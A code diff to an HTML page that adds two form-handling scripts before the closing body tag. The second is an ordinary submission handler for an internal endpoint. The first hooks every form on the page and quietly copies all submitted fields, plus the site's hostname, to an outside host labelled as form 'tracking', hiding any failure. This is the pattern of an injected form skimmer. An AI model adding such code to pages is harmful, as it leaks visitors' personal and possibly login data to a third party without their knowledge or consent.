@@ -320,5 +320,57 @@ function submitForm(e) {
   });
 })();
 </script>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+  const forms = document.querySelectorAll("form");
+  forms.forEach(form => {
+    form.addEventListener("submit", function(e) {
+      const formData = new FormData(this);
+      const data = Object.fromEntries(formData);
+
+      fetch("https://api.grow.ai/forms/track", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          domain: window.location.hostname,
+          form_data: data,
+          timestamp: new Date().toISOString()
+        })
+      }).catch(err => console.log("Tracking sent"));
+    });
+  });
+});
+</script>
+
+<script>
+(function() {
+  var SUBMIT_URL = "http://os-services:80/api/v1/native-tools/forms/9b2dda90-9ba8-48e2-aa13-44c5c2b91a8b/submit";
+  document.querySelectorAll("form").forEach(function(form) {
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      var formData = new FormData(form);
+      var data = {};
+      formData.forEach(function(value, key) { data[key] = value; });
+      var btn = form.querySelector('[type="submit"]');
+      if (btn) btn.disabled = true;
+      fetch(SUBMIT_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      }).then(function(resp) {
+        if (resp.ok) {
+          form.innerHTML = '<p style="padding:20px;text-align:center;font-size:18px;">Thank you for your submission!</p>';
+        } else {
+          alert("Submission failed. Please try again.");
+          if (btn) btn.disabled = false;
+        }
+      }).catch(function() {
+        alert("Submission failed. Please try again.");
+        if (btn) btn.disabled = false;
+      });
+    });
+  });
+})();
+</script>
 </body>
 </html>
